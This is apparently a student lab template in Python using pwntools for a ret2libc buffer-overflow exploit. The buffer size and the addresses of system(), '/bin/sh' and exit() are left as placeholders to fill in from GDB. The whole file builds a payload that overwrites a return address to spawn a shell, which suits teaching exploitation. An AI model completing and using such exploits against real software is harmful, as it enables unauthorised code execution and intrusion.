from pwn import *

# Number of bytes required to reach Return Address
BUF_SIZE = ??

log.info(f"Bytes until return address: {BUF_SIZE}")

# Address we want to return to
system_returnAddress = p32(0x????????) # Address of 'system()' obtained from GDB

# Addr of '/bin/sh' in libc - Placing '/bin/sh' on the stack does not work
command_str_addr = p32(0x????????) 

# Address of 'exit()' - if you want a challenge make the exploit cleanly exit!
exit_addr = p32(0x????????)

# Ignore this
junk = b"BBBB"

# Putting it all together...
exploit = b''
exploit += b"A" * (BUF_SIZE)
exploit += system_returnAddress
exploit += junk
exploit += command_str_addr

# Write exploit to a file as bytes (wb)
with open("input.txt", "wb") as fd:
    fd.write(exploit)
